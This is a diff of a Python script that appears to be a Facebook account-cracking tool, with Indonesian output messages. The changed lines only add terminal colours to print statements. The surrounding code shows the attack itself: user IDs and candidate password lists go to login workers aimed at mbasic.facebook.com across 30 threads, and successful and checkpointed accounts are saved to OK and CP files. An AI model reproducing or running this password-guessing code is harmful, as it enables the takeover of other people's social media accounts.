@@ -528,8 +528,8 @@ def sandimanual():
 	if ask=="":
 		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
 	elif ask=="1":
-		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
-		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
 		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -537,8 +537,8 @@ def sandimanual():
 				fall.submit(api, uid, pwek.split(","))
 		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
 	elif ask=="2":
-		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
-		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
 		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -546,8 +546,8 @@ def sandimanual():
 				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
 		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
 	elif ask=="3":
-		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
-		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
 		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -564,8 +564,8 @@ def sandiotomatis():
 	if ask=="":
 		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
 	elif ask=="1":
-		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
-		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
 		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -578,8 +578,8 @@ def sandiotomatis():
 				fall.submit(api, uid, pwx)
 		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
 	elif ask=="2":
-		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
-		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
 		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -592,8 +592,8 @@ def sandiotomatis():
 				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
 		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
 	elif ask=="3":
-		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
-		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
 		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
